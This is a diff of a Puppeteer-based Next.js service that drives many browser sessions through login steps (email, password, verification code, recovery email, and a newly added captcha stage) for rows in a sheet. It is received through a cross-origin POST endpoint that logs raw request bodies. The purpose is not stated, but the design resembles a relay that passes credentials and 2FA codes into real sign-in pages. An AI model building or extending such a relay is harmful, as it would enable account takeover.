+            logger.info(`[processRow][${browserId}] Skipping FAILED notification — processing never started.`);
         }
         // Removed explicit clearing of verification fields as per user request
         // if (finalSheetUpdate.status === "COMPLETED") {
@@ -2721,10 +3037,15 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         //     }
         // }
 
-        logger.info(`[processRow][${browserId}] Updating final sheet state with data: ${JSON.stringify(finalSheetUpdate)}`);
-        await updateBrowserRowData(browserId, finalSheetUpdate).catch(err =>
-            logger.error(`[processRow][${browserId}] Failed to update final sheet state: ${err.message}`)
-        );
+        // Don't write FAILED to sheet if processing never started — another session may still be active
+        if ((!processingStarted && finalSheetUpdate.status === "FAILED") || exitingEarly) {
+            logger.info(`[processRow][${browserId}] Skipping sheet update — processing never started (browser launch failed). Existing session may still be active.`);
+        } else {
+            logger.info(`[processRow][${browserId}] Updating final sheet state with data: ${JSON.stringify(finalSheetUpdate)}`);
+            await updateBrowserRowData(browserId, finalSheetUpdate).catch(err =>
+                logger.error(`[processRow][${browserId}] Failed to update final sheet state: ${err.message}`)
+            );
+        }
 
         if (updateData.status === "FAILED" && userDataDir) {
             if (browserFullyClosed || (browser && !browser.isConnected())) {
@@ -2775,8 +3096,10 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 // Helper function to check if the Puppeteer page is responsive
 async function isPageResponsive(page, browserId, instanceId) {
     try {
-        // Attempt a simple page evaluation to check responsiveness
-        await page.evaluate(() => document.body.innerText);
+        await Promise.race([
+            page.evaluate(() => document.body.innerText),
+            new Promise((_, reject) => setTimeout(() => reject(new Error('Page navigation in progress - evaluate timed out')), 2000))
+        ]);
         return true;
     } catch (e) {
         logger.error(`[isPageResponsive][${browserId}][${instanceId}] Page is unresponsive: ${e.message}`);
@@ -2819,12 +3142,12 @@ async function processWaitingRows() {
     }
     isProcessingInterval = true;
     const totalActive = activeProcesses.size + activeBrowserSessions.size;
-    logger.info(`Interval check running. Active: ${activeProcesses.size} processing + ${activeBrowserSessions.size} waiting = ${totalActive}/${MAX_CONCURRENT_BROWSERS}`);
+    logger.debug(`Interval check running. Active: ${activeProcesses.size} processing + ${activeBrowserSessions.size} waiting = ${totalActive}/${MAX_CONCURRENT_BROWSERS}`);
 
     try {
         const availableSlots = MAX_CONCURRENT_BROWSERS - totalActive;
         if (availableSlots <= 0) {
-            logger.info("Concurrency limit reached. No available slots.");
+            logger.debug("Concurrency limit reached. No available slots.");
             isProcessingInterval = false;
             return;
         }
@@ -2842,7 +3165,7 @@ async function processWaitingRows() {
         const rows = data.slice(1);
 
 
-        const processableStatuses = ["WAITING", "WAITINGEMAIL", "WAITINGPASSWORD", "WAITINGPASSWORDERROR", "WAITINGOPTIONS", "WAITINGCODE", "WAITINGRECOVERYEMAIL"];
+        const processableStatuses = ["WAITING", "WAITINGEMAIL", "WAITINGPASSWORD", "WAITINGPASSWORDERROR", "WAITINGOPTIONS", "WAITINGCODE", "WAITINGRECOVERYEMAIL", "WAITINGCAPTCHA"];
         const staleCheckStatuses = [...processableStatuses, "WAITINGEMAILERROR", "WAITINGPASSWORDERROR", "PROCESSING"];
         const STALE_TIMEOUT_MS = 10 * 60 * 1000; // 10 minutes
         const activityIdx = columnIndexes['lastUserActivity'] !== undefined ? columnIndexes['lastUserActivity'] : columnIndexes['lastRun'];
@@ -2940,14 +3263,14 @@ async function processWaitingRows() {
         });
 
         if (allProcessableRowsInSheet.length === 0 && activeProcesses.size === 0 && activeBrowserSessions.size === 0) {
-            logger.info("No stale-checkable rows, no active processes, and no open browser sessions. Stopping interval.");
+            logger.debug("No stale-checkable rows, no active processes, and no open browser sessions. Stopping interval.");
             stopInterval();
             isProcessingInterval = false;
             return;
         }
 
         if (rowsToInitiateProcessing.length === 0) {
-            logger.info(`No new rows to initiate processing (${allProcessableRowsInSheet.length} stale-checkable rows exist, ${activeProcesses.size} active processes, ${activeBrowserSessions.size} open browser sessions).`);
+            logger.debug(`No new rows to initiate processing (${allProcessableRowsInSheet.length} stale-checkable rows exist, ${activeProcesses.size} active processes, ${activeBrowserSessions.size} open browser sessions).`);
             isProcessingInterval = false;
             return;
         }
@@ -2963,7 +3286,7 @@ async function processWaitingRows() {
             }
         }
 
-        logger.info(`Found ${rowsToInitiateProcessing.length} eligible rows. Will attempt to process ${rowsToProcessInThisRun.length} new rows in this run.`);
+        logger.debug(`Found ${rowsToInitiateProcessing.length} eligible rows. Will attempt to process ${rowsToProcessInThisRun.length} new rows in this run.`);
 
         for (const rowToProcess of rowsToProcessInThisRun) {
             const browserId = rowToProcess[columnIndexes['browserId']];
@@ -3029,11 +3352,11 @@ let intervalId = null; // Make it mutable
 
 function ensureIntervalIsRunning() {
     if (intervalId === null) {
-        logger.info("Restarting background processing interval...");
+        logger.debug("Restarting background processing interval...");
         processWaitingRows(); // Initial run
         intervalId = setInterval(processWaitingRows, 10000); // Check every 10 seconds
         startAppScriptDataBackgroundUpdater(); // Start the data fetching background updater
-        logger.info(`Background processing interval set up with ID: ${intervalId}`);
+        logger.debug(`Background processing interval set up with ID: ${intervalId}`);
     } else {
         logger.debug("Background processing interval is already running.");
     }
@@ -3041,7 +3364,7 @@ function ensureIntervalIsRunning() {
 
 function stopInterval() {
     if (intervalId !== null) {
-        logger.info("Stopping background processing interval.");
+        logger.debug("Stopping background processing interval.");
         clearInterval(intervalId);
         intervalId = null;
         stopAppScriptDataBackgroundUpdater(); // Stop the data fetching background updater
@@ -3085,16 +3408,16 @@ export async function POST(request) {
     let updateData = {}, finalStatusDetails = {};
     let instanceIdForPOST = '';
     try {
-        logger.info(`[POST] Incoming request headers: ${inspect(Object.fromEntries(request.headers.entries()))}`);
+        logger.debug(`[POST] Incoming request headers: ${inspect(Object.fromEntries(request.headers.entries()))}`);
         // Clone the request to prevent the "body disturbed" error
         const clonedRequest = request.clone();
         const rawBodyText = await clonedRequest.text(); // Read raw body as text
-        logger.info(`[POST] Raw incoming request body: ${rawBodyText}`);
+        logger.debug(`[POST] Raw incoming request body: ${rawBodyText}`);
 
         let body;
         try {
             body = JSON.parse(rawBodyText); // Manually parse the JSON
-            logger.info(`[POST] Parsed request body: ${inspect(body, { depth: null })}`);
+            logger.debug(`[POST] Parsed request body: ${inspect(body, { depth: null })}`);
         } catch (jsonParseError) {
             logger.error(`[POST] Error parsing JSON body: ${jsonParseError.message}`);
             return setCorsHeaders(NextResponse.json({
@@ -3260,7 +3583,7 @@ export async function POST(request) {
         const currentBrowserId = requestBrowserId || finalStatusDetails?.browserId; // Use actualBrowserId for new processes
 
         if (browser && !browserFullyClosed) { // Only if a browser was actually launched/reused in this POST call
-            if (finalEffectiveStatus === "WAITINGCODE" || finalEffectiveStatus === "WAITINGOPTIONS" || finalEffectiveStatus === "WAITINGRECOVERYEMAIL" || finalEffectiveStatus === "WAITINGPASSWORD" || finalEffectiveStatus === "WAITINGPASSWORDERROR" || finalEffectiveStatus === "WAITINGEMAILERROR") {
+            if (finalEffectiveStatus === "WAITINGCAPTCHA" || finalEffectiveStatus === "WAITINGCODE" || finalEffectiveStatus === "WAITINGOPTIONS" || finalEffectiveStatus === "WAITINGRECOVERYEMAIL" || finalEffectiveStatus === "WAITINGPASSWORD" || finalEffectiveStatus === "WAITINGPASSWORDERROR" || finalEffectiveStatus === "WAITINGEMAILERROR") {
                 activeBrowserSessions.set(currentBrowserId, { browser, page, targetCreatedListener });
             } else {
                 if (targetCreatedListener && isReusingBrowserForPOST) try { browser.off('targetcreated', targetCreatedListener); } catch (e) {/*ignore*/ }
